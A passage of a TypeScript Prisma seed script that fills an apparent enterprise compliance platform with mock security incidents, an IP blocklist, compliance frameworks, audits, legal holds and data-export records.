        type: 'API_ABUSE',
        severity: 'WARNING',
        status: 'CONTAINED',
        source: '172.217.14.110',
        description: 'Excessive API usage beyond normal patterns',
        details: { normalUsage: 100, currentUsage: 5000, increase: '5000%' },
        createdAt: new Date(now.getTime() - 8 * 60 * 60 * 1000),
      },
      {
        type: 'INSIDER_THREAT',
        severity: 'CRITICAL',
        status: 'OPEN',
        source: 'internal_system',
        orgId: enterpriseCo.id,
        userId: sarahEnterprise.id,
        description: 'Unusual data access pattern by privileged user',
        details: { normalAccessVolume: '10 records/day', currentAccess: '5000 records', dataType: 'customer_pii' },
        createdAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
      },
      {
        type: 'MALWARE_DETECTED',
        severity: 'CRITICAL',
        status: 'RESOLVED',
        source: 'file_scanner',
        description: 'Malware detected in uploaded file',
        details: { fileName: 'report.xlsx.exe', malwareType: 'Trojan.Generic', scanner: 'ClamAV' },
        createdAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        mitigatedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 500),
        mitigation: 'File quarantined, upload rejected',
      },
      {
        type: 'DDOS_ATTEMPT',
        severity: 'CRITICAL',
        status: 'MITIGATED',
        source: 'multiple',
        description: 'Distributed denial of service attack on platform',
        details: { peakTraffic: '50 Gbps', duration: '45 minutes', botnetSize: 'estimated 100k nodes' },
        createdAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
        mitigatedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000 + 2700000),
        mitigation: 'Traffic rerouted through DDoS protection, attack absorbed',
      },
    ]
  })

  // ==================== IP BLOCKLIST ====================
  console.log('🚫 Creating IP blocklist...')

  await prisma.iPBlocklist.createMany({
    data: [
      {
        ipAddress: '45.33.32.156',
        type: 'BRUTE_FORCE',
        reason: 'Repeated brute force attacks and credential stuffing attempts',
        metadata: { attacks: 15, lastAttack: now.toISOString(), country: 'Unknown' },
      },
      {
        ipAddress: '185.220.100.0/24',
        ipRange: '185.220.100.0/24',
        type: 'THREAT_INTEL',
        reason: 'Known Tor exit node range',
        metadata: { category: 'tor_exit_nodes', provider: 'TorProject' },
      },
      {
        ipAddress: '103.21.244.0',
        ipRange: '103.21.244.0/24',
        type: 'AUTOMATIC',
        reason: 'Suspicious scanning activity detected',
        expiresAt: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000),
        metadata: { scannedPorts: [22, 80, 443, 3306, 5432], scanDuration: '2 hours' },
      },
      {
        ipAddress: '198.51.100.42',
        type: 'AUTOMATIC',
        reason: 'SQL injection attacks',
        metadata: { attackType: 'sql_injection', attempts: 50 },
      },
      {
        ipAddress: '223.5.5.0',
        ipRange: '223.5.5.0/24',
        type: 'GEOGRAPHIC',
        reason: 'Geographic restriction - China',
        metadata: { country: 'CN', reason: 'compliance_requirement' },
      },
      {
        ipAddress: '203.0.113.50',
        type: 'AUTOMATIC',
        reason: 'XSS attack attempts',
        expiresAt: new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000),
        metadata: { attackType: 'xss', blocked: true },
      },
      {
        ipAddress: '104.18.32.0',
        ipRange: '104.18.32.0/24',
        type: 'AUTOMATIC',
        reason: 'Excessive API requests - possible scraping',
        expiresAt: new Date(now.getTime() + 24 * 60 * 60 * 1000),
        metadata: { requestsPerMinute: 500, limit: 100 },
      },
      // Additional IP blocklist entries to reach 10
      {
        ipAddress: '91.134.175.0',
        ipRange: '91.134.175.0/24',
        type: 'THREAT_INTEL',
        reason: 'Known malicious hosting provider range',
        metadata: { provider: 'threat_intel_feed', category: 'malicious_hosting', confidence: 95 },
      },
      {
        ipAddress: '192.0.2.100',
        type: 'MANUAL',
        reason: 'Reported for phishing campaign targeting platform users',
        metadata: { reportedBy: 'security_team', incidentId: 'INC-2025-001', phishingDomain: 'gwi-secure.fake.com' },
      },
      {
        ipAddress: '198.18.0.0',
        ipRange: '198.18.0.0/15',
        type: 'GEOGRAPHIC',
        reason: 'Geographic restriction - North Korea',
        metadata: { country: 'KP', reason: 'sanctions_compliance', regulatory: 'OFAC' },
      },
    ]
  })

  // ==================== COMPLIANCE FRAMEWORKS ====================
  console.log('📋 Creating compliance frameworks...')

  const soc2Framework = await prisma.complianceFramework.create({
    data: {
      name: 'SOC 2 Type II',
      code: 'SOC2',
      description: 'Service Organization Control 2 - Trust Services Criteria for Security, Availability, and Confidentiality',
      version: '2017',
      // category: 'SECURITY',
      requirements: [
        { id: 'CC1.1', name: 'Control Environment', description: 'Management philosophy and operating style' },
        { id: 'CC2.1', name: 'Communication and Information', description: 'Quality information and internal communication' },
        { id: 'CC3.1', name: 'Risk Assessment', description: 'Risk identification and analysis' },
        { id: 'CC4.1', name: 'Monitoring Activities', description: 'Ongoing evaluations and remediation' },
        { id: 'CC5.1', name: 'Control Activities', description: 'Policies and procedures' },
        { id: 'CC6.1', name: 'Logical and Physical Access', description: 'Access control mechanisms' },
        { id: 'CC7.1', name: 'System Operations', description: 'Infrastructure monitoring and incident management' },
        { id: 'CC8.1', name: 'Change Management', description: 'Change control procedures' },
        { id: 'CC9.1', name: 'Risk Mitigation', description: 'Business continuity and disaster recovery' },
      ],
      controls: [
        { id: 'CC6.1.1', requirement: 'CC6.1', name: 'User Access Management', implemented: true },
        { id: 'CC6.1.2', requirement: 'CC6.1', name: 'MFA Implementation', implemented: true },
        { id: 'CC7.1.1', requirement: 'CC7.1', name: 'Security Monitoring', implemented: true },
        { id: 'CC8.1.1', requirement: 'CC8.1', name: 'Change Approval Process', implemented: true },
      ],
      isActive: true,
      // effectiveDate: new Date('2024-01-01'),
    }
  })

  const hipaaFramework = await prisma.complianceFramework.create({
    data: {
      name: 'HIPAA',
      code: 'HIPAA',
      description: 'Health Insurance Portability and Accountability Act - Privacy and Security Rules',
      version: '2013',
      // category: 'PRIVACY',
      requirements: [
        { id: '164.308', name: 'Administrative Safeguards', description: 'Security management and workforce security' },
        { id: '164.310', name: 'Physical Safeguards', description: 'Facility access and device security' },
        { id: '164.312', name: 'Technical Safeguards', description: 'Access control and audit controls' },
        { id: '164.314', name: 'Organizational Requirements', description: 'Business associate contracts' },
        { id: '164.316', name: 'Policies and Procedures', description: 'Documentation requirements' },
      ],
      controls: [
        { id: '164.308.a1', requirement: '164.308', name: 'Risk Analysis', implemented: true },
        { id: '164.312.a1', requirement: '164.312', name: 'Unique User Identification', implemented: true },
        { id: '164.312.b', requirement: '164.312', name: 'Audit Controls', implemented: true },
        { id: '164.312.e1', requirement: '164.312', name: 'Encryption', implemented: true },
      ],
      isActive: true,
      // effectiveDate: new Date('2024-01-01'),
    }
  })

  const gdprFramework = await prisma.complianceFramework.create({
    data: {
      name: 'GDPR',
      code: 'GDPR',
      description: 'General Data Protection Regulation - EU Data Protection Law',
      version: '2018',
      // category: 'PRIVACY',
      requirements: [
        { id: 'Art5', name: 'Principles of Processing', description: 'Lawfulness, fairness, transparency' },
        { id: 'Art6', name: 'Lawful Basis', description: 'Legal grounds for processing' },
        { id: 'Art7', name: 'Consent', description: 'Conditions for consent' },
        { id: 'Art12-14', name: 'Transparency', description: 'Information to be provided to data subjects' },
        { id: 'Art15-22', name: 'Data Subject Rights', description: 'Access, rectification, erasure, portability' },
        { id: 'Art25', name: 'Data Protection by Design', description: 'Privacy by design and default' },
        { id: 'Art32', name: 'Security of Processing', description: 'Technical and organizational measures' },
        { id: 'Art33-34', name: 'Breach Notification', description: 'Data breach notification requirements' },
      ],
      controls: [
        { id: 'Art32.1a', requirement: 'Art32', name: 'Pseudonymization and Encryption', implemented: true },
        { id: 'Art32.1b', requirement: 'Art32', name: 'Confidentiality and Integrity', implemented: true },
        { id: 'Art33.1', requirement: 'Art33-34', name: 'Breach Notification Process', implemented: true },
        { id: 'Art25.1', requirement: 'Art25', name: 'Privacy by Design', implemented: true },
      ],
      isActive: true,
      // effectiveDate: new Date('2024-01-01'),
    }
  })

  const iso27001Framework = await prisma.complianceFramework.create({
    data: {
      name: 'ISO 27001',
      code: 'ISO27001',
      description: 'Information Security Management System Standard',
      version: '2022',
      // category: 'SECURITY',
      requirements: [
        { id: 'A.5', name: 'Organizational Controls', description: 'Policies, roles, responsibilities' },
        { id: 'A.6', name: 'People Controls', description: 'Screening, awareness, responsibilities' },
        { id: 'A.7', name: 'Physical Controls', description: 'Physical security perimeters and entry' },
        { id: 'A.8', name: 'Technological Controls', description: 'User endpoints, privileged access, malware' },
      ],
      controls: [
        { id: 'A.5.1', requirement: 'A.5', name: 'Information Security Policy', implemented: true },
        { id: 'A.8.2', requirement: 'A.8', name: 'Privileged Access Rights', implemented: true },
        { id: 'A.8.12', requirement: 'A.8', name: 'Data Leakage Prevention', implemented: true },
        { id: 'A.8.24', requirement: 'A.8', name: 'Use of Cryptography', implemented: true },
      ],
      isActive: true,
      // effectiveDate: new Date('2024-01-01'),
    }
  })

  const pciDssFramework = await prisma.complianceFramework.create({
    data: {
      name: 'PCI DSS',
      code: 'PCI-DSS',
      description: 'Payment Card Industry Data Security Standard',
      version: '4.0',
      // category: 'DATA_SECURITY',
      requirements: [
        { id: 'Req1', name: 'Network Security Controls', description: 'Firewall and network security' },
        { id: 'Req2', name: 'Secure Configurations', description: 'Vendor default security parameters' },
        { id: 'Req3', name: 'Protect Account Data', description: 'Encryption and protection of stored data' },
        { id: 'Req4', name: 'Protect Cardholder Data', description: 'Encryption during transmission' },
        { id: 'Req5', name: 'Anti-Malware', description: 'Protect systems from malware' },
        { id: 'Req6', name: 'Secure Development', description: 'Secure systems and applications' },
        { id: 'Req7', name: 'Access Restriction', description: 'Restrict access to need-to-know' },
        { id: 'Req8', name: 'User Identification', description: 'Identify users and authenticate' },
        { id: 'Req9', name: 'Physical Access', description: 'Restrict physical access' },
        { id: 'Req10', name: 'Logging and Monitoring', description: 'Track and monitor access' },
        { id: 'Req11', name: 'Security Testing', description: 'Test security systems regularly' },
        { id: 'Req12', name: 'Information Security Policy', description: 'Security policy for personnel' },
      ],
      controls: [
        { id: 'Req3.5.1', requirement: 'Req3', name: 'Encryption Key Management', implemented: true },
        { id: 'Req8.3.1', requirement: 'Req8', name: 'Multi-Factor Authentication', implemented: true },
        { id: 'Req10.2', requirement: 'Req10', name: 'Audit Trail Implementation', implemented: true },
      ],
      isActive: false,
      // effectiveDate: new Date('2024-03-31'),
    }
  })

  // Additional compliance frameworks to reach 10
  const ccpaFramework = await prisma.complianceFramework.create({
    data: {
      name: 'CCPA',
      code: 'CCPA',
      description: 'California Consumer Privacy Act - Consumer data privacy rights',
      version: '2020',
      requirements: [
        { id: 'CCPA-1', name: 'Right to Know', description: 'Consumer right to know what data is collected' },
        { id: 'CCPA-2', name: 'Right to Delete', description: 'Consumer right to request deletion' },
        { id: 'CCPA-3', name: 'Right to Opt-Out', description: 'Right to opt out of sale of personal information' },
        { id: 'CCPA-4', name: 'Non-Discrimination', description: 'Right to non-discrimination for exercising rights' },
      ],
      controls: [
        { id: 'CCPA-1.1', requirement: 'CCPA-1', name: 'Privacy Notice', implemented: true },
        { id: 'CCPA-2.1', requirement: 'CCPA-2', name: 'Deletion Process', implemented: true },
      ],
      isActive: true,
    }
  })

  const fedrampFramework = await prisma.complianceFramework.create({
    data: {
      name: 'FedRAMP',
      code: 'FEDRAMP',
      description: 'Federal Risk and Authorization Management Program',
      version: '2023',
      requirements: [
        { id: 'AC', name: 'Access Control', description: 'Access control policies and procedures' },
        { id: 'AU', name: 'Audit and Accountability', description: 'Audit and accountability measures' },
        { id: 'CM', name: 'Configuration Management', description: 'System configuration controls' },
        { id: 'IR', name: 'Incident Response', description: 'Incident response capabilities' },
        { id: 'SC', name: 'System and Communications Protection', description: 'Communications security' },
      ],
      controls: [
        { id: 'AC-2', requirement: 'AC', name: 'Account Management', implemented: true },
        { id: 'AU-2', requirement: 'AU', name: 'Audit Events', implemented: true },
      ],
      isActive: false,
    }
  })

  const nistFramework = await prisma.complianceFramework.create({
    data: {
      name: 'NIST Cybersecurity Framework',
      code: 'NIST-CSF',
      description: 'NIST Cybersecurity Framework for managing cybersecurity risk',
      version: '2.0',
      requirements: [
        { id: 'ID', name: 'Identify', description: 'Asset management and risk assessment' },
        { id: 'PR', name: 'Protect', description: 'Access control and data security' },
        { id: 'DE', name: 'Detect', description: 'Continuous monitoring and detection' },
        { id: 'RS', name: 'Respond', description: 'Response planning and communications' },
        { id: 'RC', name: 'Recover', description: 'Recovery planning and improvements' },
      ],
      controls: [
        { id: 'PR.AC-1', requirement: 'PR', name: 'Identity Management', implemented: true },
        { id: 'DE.CM-1', requirement: 'DE', name: 'Network Monitoring', implemented: true },
      ],
      isActive: true,
    }
  })

  const soxFramework = await prisma.complianceFramework.create({
    data: {
      name: 'SOX Compliance',
      code: 'SOX',
      description: 'Sarbanes-Oxley Act financial reporting and internal controls',
      version: '2002',
      requirements: [
        { id: 'SOX-302', name: 'Corporate Responsibility', description: 'CEO/CFO certification requirements' },
        { id: 'SOX-404', name: 'Internal Controls', description: 'Assessment of internal controls' },
        { id: 'SOX-409', name: 'Real-Time Disclosure', description: 'Rapid and current disclosure' },
      ],
      controls: [
        { id: 'SOX-404.1', requirement: 'SOX-404', name: 'Control Documentation', implemented: true },
        { id: 'SOX-404.2', requirement: 'SOX-404', name: 'Control Testing', implemented: true },
      ],
      isActive: true,
    }
  })

  const cmmcFramework = await prisma.complianceFramework.create({
    data: {
      name: 'CMMC',
      code: 'CMMC',
      description: 'Cybersecurity Maturity Model Certification for defense contractors',
      version: '2.0',
      requirements: [
        { id: 'L1', name: 'Level 1 - Foundational', description: 'Basic cyber hygiene' },
        { id: 'L2', name: 'Level 2 - Advanced', description: 'Good cyber hygiene with documentation' },
        { id: 'L3', name: 'Level 3 - Expert', description: 'Advanced/progressive practices' },
      ],
      controls: [
        { id: 'L1.AC', requirement: 'L1', name: 'Access Control', implemented: true },
        { id: 'L2.IA', requirement: 'L2', name: 'Identification and Authentication', implemented: true },
      ],
      isActive: false,
    }
  })

  // ==================== COMPLIANCE ATTESTATIONS ====================
  console.log('✅ Creating compliance attestations...')

  await prisma.complianceAttestation.createMany({
    data: [
      {
        frameworkId: soc2Framework.id,
        orgId: enterpriseCo.id,
        status: 'CERTIFIED',
        attestedBy: 'Deloitte & Touche LLP',
        attestationDate: new Date('2024-06-15'),
        expiresAt: new Date('2025-06-15'),
        certificateUrl: 'https://certs.gwi.com/soc2/enterprise-co-2024.pdf',
        findings: [],
        scope: { services: ['GWI Platform', 'API Services', 'Data Processing'], locations: ['US', 'EU'] },
      },
      {
        frameworkId: gdprFramework.id,
        orgId: enterpriseCo.id,
        status: 'CERTIFIED',
        attestedBy: 'TrustArc',
        attestationDate: new Date('2024-03-01'),
        expiresAt: new Date('2025-03-01'),
        findings: [],
        scope: { dataTypes: ['customer_data', 'analytics_data'], regions: ['EU', 'UK'] },
      },
      {
        frameworkId: soc2Framework.id,
        orgId: acmeCorp.id,
        status: 'IN_PROGRESS',
        attestedBy: 'Ernst & Young',
        findings: [{ type: 'observation', area: 'CC6.1', description: 'MFA enrollment rate below target' }],
        scope: { services: ['GWI Platform'], locations: ['US'] },
      },
      {
        frameworkId: hipaaFramework.id,
        orgId: enterpriseCo.id,
        status: 'OPEN',
        attestedBy: 'KPMG',
        findings: [
          { type: 'finding', area: '164.312', description: 'Encryption key rotation policy needs update', severity: 'medium' },
        ],
        scope: { services: ['Healthcare Data Module'], dataTypes: ['PHI'] },
      },
      {
        frameworkId: iso27001Framework.id,
        orgId: enterpriseCo.id,
        status: 'CERTIFIED',
        attestedBy: 'BSI Group',
        attestationDate: new Date('2024-09-01'),
        expiresAt: new Date('2027-09-01'),
        certificateUrl: 'https://certs.gwi.com/iso27001/enterprise-co-2024.pdf',
        findings: [],
        scope: { services: ['All Platform Services'], locations: ['Global'] },
      },
      {
        frameworkId: gdprFramework.id,
        orgId: acmeCorp.id,
        status: 'EXPIRED',
        attestedBy: 'TrustArc',
        attestationDate: new Date('2023-03-01'),
        expiresAt: new Date('2024-03-01'),
        findings: [],
        scope: { dataTypes: ['customer_data'], regions: ['EU'] },
      },
      // Additional attestations to reach 10
      {
        frameworkId: ccpaFramework.id,
        orgId: acmeCorp.id,
        status: 'CERTIFIED',
        attestedBy: 'Privacy Rights Clearinghouse',
        attestationDate: new Date('2024-08-01'),
        expiresAt: new Date('2025-08-01'),
        findings: [],
        scope: { dataTypes: ['consumer_data'], regions: ['California'] },
      },
      {
        frameworkId: nistFramework.id,
        orgId: enterpriseCo.id,
        status: 'IN_PROGRESS',
        attestedBy: 'CyberSecure Assessment Group',
        findings: [{ type: 'observation', area: 'PR', description: 'Additional training recommended for IT staff' }],
        scope: { services: ['All Services'], maturityLevel: 'Tier 3' },
      },
      {
        frameworkId: soxFramework.id,
        orgId: enterpriseCo.id,
        status: 'CERTIFIED',
        attestedBy: 'PricewaterhouseCoopers',
        attestationDate: new Date('2024-12-15'),
        expiresAt: new Date('2025-12-15'),
        certificateUrl: 'https://certs.gwi.com/sox/enterprise-co-2024.pdf',
        findings: [],
        scope: { controls: ['IT General Controls', 'Financial Reporting'], fiscalYear: '2024' },
      },
      {
        frameworkId: pciDssFramework.id,
        orgId: acmeCorp.id,
        status: 'OPEN',
        attestedBy: 'SecurityMetrics',
        findings: [{ type: 'finding', area: 'Req11', description: 'Quarterly vulnerability scans need documentation', severity: 'low' }],
        scope: { services: ['Payment Processing'], cardBrands: ['Visa', 'Mastercard'] },
      },
    ]
  })

  // ==================== COMPLIANCE AUDITS ====================
  console.log('🔍 Creating compliance audits...')

  await prisma.complianceAudit.createMany({
    data: [
      {
        frameworkId: soc2Framework.id,
        orgId: enterpriseCo.id,
        auditType: 'EXTERNAL',
        status: 'COMPLETED',
        auditor: 'Deloitte & Touche LLP',
        leadAuditor: 'Jennifer Williams, CISA',
        scheduledDate: new Date('2024-05-01'),
        startDate: new Date('2024-05-01'),
        endDate: new Date('2024-06-10'),
        scope: { period: '2023-06-01 to 2024-05-31', services: ['GWI Platform', 'API Services'] },
        findings: [],
        recommendations: ['Continue MFA rollout', 'Enhance logging retention'],
        reportUrl: 'https://audits.gwi.com/soc2/enterprise-2024-final.pdf',
      },
      {
        frameworkId: soc2Framework.id,
        orgId: acmeCorp.id,
        auditType: 'EXTERNAL',
        status: 'IN_PROGRESS',
        auditor: 'Ernst & Young',
        leadAuditor: 'Michael Chen, CISA',
        scheduledDate: new Date('2025-01-15'),
        startDate: new Date('2025-01-15'),
        scope: { period: '2024-01-01 to 2024-12-31', services: ['GWI Platform'] },
        findings: [{ controlId: 'CC6.1', finding: 'MFA not enforced for all users', severity: 'medium', status: 'open' }],
      },
      {
        frameworkId: gdprFramework.id,
        auditType: 'INTERNAL',
        status: 'COMPLETED',
        auditor: 'Internal Audit Team',
        leadAuditor: 'Sarah Johnson, DPO',
        scheduledDate: new Date('2024-10-01'),
        startDate: new Date('2024-10-01'),
        endDate: new Date('2024-10-15'),
        scope: { areas: ['Data Subject Rights', 'Consent Management', 'Data Retention'] },
        findings: [{ area: 'Art15', finding: 'DSR response time occasionally exceeds 30 days', severity: 'low', status: 'remediated' }],
        recommendations: ['Automate DSR workflow', 'Add capacity during peak periods'],
      },
      {
        frameworkId: iso27001Framework.id,
        orgId: enterpriseCo.id,
        auditType: 'EXTERNAL',
        status: 'SCHEDULED',
        auditor: 'BSI Group',
        scheduledDate: new Date('2025-03-01'),
        scope: { type: 'surveillance', areas: ['A.5', 'A.8'] },
      },
      {
        frameworkId: hipaaFramework.id,
        orgId: enterpriseCo.id,
        auditType: 'EXTERNAL',
        status: 'SCHEDULED',
        auditor: 'KPMG',
        scheduledDate: new Date('2025-02-15'),
        scope: { module: 'Healthcare Data Processing', controls: ['164.308', '164.312'] },
      },
      // Additional audits to reach 10
      {
        frameworkId: ccpaFramework.id,
        orgId: acmeCorp.id,
        auditType: 'INTERNAL',
        status: 'COMPLETED',
        auditor: 'Internal Privacy Team',
        leadAuditor: 'Mark Thompson, CIPP',
        scheduledDate: new Date('2024-11-01'),
        startDate: new Date('2024-11-01'),
        endDate: new Date('2024-11-10'),
        scope: { areas: ['Consumer Rights', 'Data Mapping', 'Vendor Management'] },
        findings: [],
        recommendations: ['Update privacy policy', 'Implement automated DSR tracking'],
      },
      {
        frameworkId: nistFramework.id,
        orgId: enterpriseCo.id,
        auditType: 'EXTERNAL',
        status: 'COMPLETED',
        auditor: 'Coalfire',
        leadAuditor: 'Robert Kim, CISSP',
        scheduledDate: new Date('2024-08-01'),
        startDate: new Date('2024-08-01'),
        endDate: new Date('2024-08-30'),
        scope: { functions: ['Identify', 'Protect', 'Detect', 'Respond', 'Recover'] },
        findings: [{ area: 'RS', finding: 'Incident response playbooks need updating', severity: 'medium', status: 'remediated' }],
        recommendations: ['Update IR playbooks quarterly', 'Conduct tabletop exercises'],
        reportUrl: 'https://audits.gwi.com/nist/enterprise-2024-assessment.pdf',
      },
      {
        frameworkId: soxFramework.id,
        orgId: enterpriseCo.id,
        auditType: 'EXTERNAL',
        status: 'COMPLETED',
        auditor: 'Grant Thornton',
        leadAuditor: 'Susan Davis, CPA',
        scheduledDate: new Date('2024-09-01'),
        startDate: new Date('2024-09-01'),
        endDate: new Date('2024-10-31'),
        scope: { sections: ['302', '404'], fiscalYear: '2024' },
        findings: [],
        recommendations: ['Continue quarterly control testing'],
        reportUrl: 'https://audits.gwi.com/sox/enterprise-2024-final.pdf',
      },
      {
        frameworkId: pciDssFramework.id,
        orgId: acmeCorp.id,
        auditType: 'EXTERNAL',
        status: 'IN_PROGRESS',
        auditor: 'Trustwave',
        leadAuditor: 'James Wilson, QSA',
        scheduledDate: new Date('2025-01-01'),
        startDate: new Date('2025-01-01'),
        scope: { level: 'Level 3 Merchant', requirements: ['All 12 requirements'] },
        findings: [{ requirement: 'Req11', finding: 'Penetration test overdue', severity: 'high', status: 'open' }],
      },
      {
        frameworkId: gdprFramework.id,
        orgId: enterpriseCo.id,
        auditType: 'EXTERNAL',
        status: 'COMPLETED',
        auditor: 'EY Advisory',
        leadAuditor: 'Emma Schmidt, CIPP/E',
        scheduledDate: new Date('2024-07-01'),
        startDate: new Date('2024-07-01'),
        endDate: new Date('2024-07-20'),
        scope: { articles: ['5-7', '12-22', '24-34'], dataCategories: ['customer', 'employee'] },
        findings: [],
        recommendations: ['Implement data minimization review process'],
        reportUrl: 'https://audits.gwi.com/gdpr/enterprise-2024.pdf',
      },
    ]
  })

  // ==================== LEGAL HOLDS ====================
  console.log('⚖️ Creating legal holds...')

  const legalHold1 = await prisma.legalHold.create({
    data: {
      name: 'Smith v. DataCorp Litigation',
      description: 'Legal hold for all documents related to Smith v. DataCorp class action lawsuit regarding data privacy',
      status: 'OPEN',
      reason: 'Pending litigation - class action lawsuit',
      caseReference: 'Case No. 2024-CV-12345',
      custodians: [johnDoe.id, janeSmith.id, adminUser.id],
      scope: {
        dataTypes: ['emails', 'documents', 'chat_logs', 'audit_logs'],
        dateRange: { start: '2023-01-01', end: '2024-06-30' },
        keywords: ['privacy', 'data breach', 'consent'],
      },
      createdBy: superAdmin?.id || 'system',
      startDate: new Date('2024-06-01'),
      notificationSent: true,
      acknowledgements: [
        { userId: johnDoe.id, acknowledgedAt: new Date('2024-06-02').toISOString() },
        { userId: janeSmith.id, acknowledgedAt: new Date('2024-06-03').toISOString() },
      ],
    }
  })

  const legalHold2 = await prisma.legalHold.create({
    data: {
      name: 'Regulatory Investigation - FTC',
      description: 'Document preservation for FTC investigation into data practices',
      status: 'OPEN',
      reason: 'Regulatory investigation',
      caseReference: 'FTC File No. 2024-INV-789',
      custodians: [adminUser.id, sarahEnterprise.id],
      scope: {
        dataTypes: ['all'],
        dateRange: { start: '2022-01-01', end: 'present' },
        departments: ['Engineering', 'Data Science', 'Legal'],
      },
      createdBy: superAdmin?.id || 'system',
      startDate: new Date('2024-09-15'),
      notificationSent: true,
      acknowledgements: [
        { userId: adminUser.id, acknowledgedAt: new Date('2024-09-16').toISOString() },
      ],
    }
  })

  await prisma.legalHold.create({
    data: {
      name: 'Employment Matter - Doe Termination',
      description: 'Preservation of documents related to employee termination dispute',
      status: 'RELEASED',
      reason: 'Employment litigation',
      caseReference: 'HR-2024-456',
      custodians: [adminUser.id],
      scope: {
        dataTypes: ['emails', 'hr_records', 'performance_reviews'],
        dateRange: { start: '2023-06-01', end: '2024-03-31' },
      },
      createdBy: superAdmin?.id || 'system',
      startDate: new Date('2024-04-01'),
      endDate: new Date('2024-11-15'),
      notificationSent: true,
      acknowledgements: [],
      releaseReason: 'Matter settled out of court',
    }
  })

  await prisma.legalHold.create({
    data: {
      name: 'IP Dispute - TechCorp',
      description: 'Legal hold for intellectual property dispute with TechCorp',
      status: 'PENDING',
      reason: 'Anticipated litigation - IP dispute',
      custodians: [bobWilson.id],
      scope: {
        dataTypes: ['source_code', 'design_docs', 'emails'],
        dateRange: { start: '2023-01-01', end: 'present' },
        projects: ['Project Alpha', 'Analytics Engine'],
      },
      createdBy: platformAdmin?.id || 'system',
      notificationSent: false,
    }
  })

  // Additional legal holds to reach 10
  await prisma.legalHold.create({
    data: {
      name: 'SEC Investigation - Securities Violations',
      description: 'Document preservation for SEC inquiry into securities practices',
      status: 'OPEN',
      reason: 'Regulatory investigation - SEC',
      caseReference: 'SEC File No. HO-2024-5678',
      custodians: [adminUser.id, sarahEnterprise.id],
      scope: {
        dataTypes: ['financial_records', 'emails', 'trading_logs'],
        dateRange: { start: '2023-06-01', end: 'present' },
        departments: ['Finance', 'Executive', 'Legal'],
      },
      createdBy: superAdmin?.id || 'system',
      startDate: new Date('2024-11-01'),
      notificationSent: true,
      acknowledgements: [
        { userId: adminUser.id, acknowledgedAt: new Date('2024-11-02').toISOString() },
      ],
    }
  })

  await prisma.legalHold.create({
    data: {
      name: 'Contract Dispute - Vendor ABC',
      description: 'Preservation for breach of contract claim against vendor',
      status: 'OPEN',
      reason: 'Contract dispute litigation',
      caseReference: 'Case No. 2024-BC-9012',
      custodians: [johnDoe.id],
      scope: {
        dataTypes: ['contracts', 'emails', 'invoices', 'communications'],
        dateRange: { start: '2022-01-01', end: '2024-12-31' },
        keywords: ['Vendor ABC', 'service agreement', 'SLA'],
      },
      createdBy: platformAdmin?.id || 'system',
      startDate: new Date('2024-10-15'),
      notificationSent: true,
      acknowledgements: [
        { userId: johnDoe.id, acknowledgedAt: new Date('2024-10-16').toISOString() },
      ],
    }
  })

  await prisma.legalHold.create({
    data: {
      name: 'Whistleblower Investigation',
      description: 'Internal investigation following whistleblower complaint',
      status: 'OPEN',
      reason: 'Internal investigation - whistleblower',
      caseReference: 'INT-2024-WB-001',
      custodians: [adminUser.id, janeSmith.id, sarahEnterprise.id],
      scope: {
        dataTypes: ['all'],
        dateRange: { start: '2024-01-01', end: 'present' },
        departments: ['Sales', 'Marketing', 'Operations'],
      },
      createdBy: superAdmin?.id || 'system',
      startDate: new Date('2024-12-01'),
      notificationSent: true,
      acknowledgements: [],
    }
  })

  await prisma.legalHold.create({
    data: {
      name: 'EEOC Discrimination Claim',
      description: 'Document preservation for EEOC discrimination investigation',
      status: 'RELEASED',
      reason: 'Employment discrimination claim',
      caseReference: 'EEOC No. 440-2024-00123',
      custodians: [adminUser.id],
      scope: {
        dataTypes: ['hr_records', 'emails', 'performance_reviews', 'compensation_data'],
        dateRange: { start: '2022-01-01', end: '2024-06-30' },
      },
      createdBy: superAdmin?.id || 'system',
      startDate: new Date('2024-03-01'),
      endDate: new Date('2024-12-01'),
      notificationSent: true,
      releaseReason: 'EEOC closed investigation with no finding',
    }
  })

  await prisma.legalHold.create({
    data: {
      name: 'Data Breach Response - Q4 2024',
      description: 'Preservation for potential data breach notification and litigation',
      status: 'OPEN',
      reason: 'Data breach incident response',
      caseReference: 'BREACH-2024-Q4-001',
      custodians: [adminUser.id, johnDoe.id, sarahEnterprise.id, bobWilson.id],
      scope: {
        dataTypes: ['security_logs', 'access_logs', 'system_configs', 'emails'],
        dateRange: { start: '2024-10-01', end: 'present' },
        systems: ['Authentication', 'Database', 'API Gateway'],
      },
      createdBy: superAdmin?.id || 'system',
      startDate: new Date('2024-12-10'),
      notificationSent: true,
      acknowledgements: [
        { userId: adminUser.id, acknowledgedAt: new Date('2024-12-10').toISOString() },
        { userId: johnDoe.id, acknowledgedAt: new Date('2024-12-11').toISOString() },
      ],
    }
  })

  await prisma.legalHold.create({
    data: {
      name: 'M&A Due Diligence - Project Phoenix',
      description: 'Document preservation for merger acquisition due diligence',
      status: 'PENDING',
      reason: 'M&A transaction due diligence',
      caseReference: 'MA-2025-PHOENIX',
      custodians: [sarahEnterprise.id],
      scope: {
        dataTypes: ['financial_records', 'contracts', 'ip_assets', 'employee_data'],
        dateRange: { start: '2020-01-01', end: 'present' },
      },
      createdBy: superAdmin?.id || 'system',
      notificationSent: false,
    }
  })

  // ==================== DATA EXPORTS ====================
  console.log('📤 Creating data exports...')

  await prisma.dataExport.createMany({
    data: [
      {
        orgId: acmeCorp.id,
        requestedBy: adminUser.id,
        type: 'GDPR_SAR',
        status: 'COMPLETED',
        scope: { userId: johnDoe.id, dataTypes: ['profile', 'activity', 'preferences'] },
        format: 'JSON',
        fileUrl: 'https://exports.gwi.com/sar/acme-johndoe-2024.zip',
        fileSize: 15678432,
        recordCount: 45678,
        requestedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
        completedAt: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 25 * 24 * 60 * 60 * 1000),
      },
      {
        orgId: enterpriseCo.id,
        requestedBy: sarahEnterprise.id,
        type: 'FULL_EXPORT',
        status: 'PROCESSING',
        scope: { allData: true, dateRange: { start: '2024-01-01', end: '2024-12-31' } },
        format: 'CSV',
        recordCount: 0,
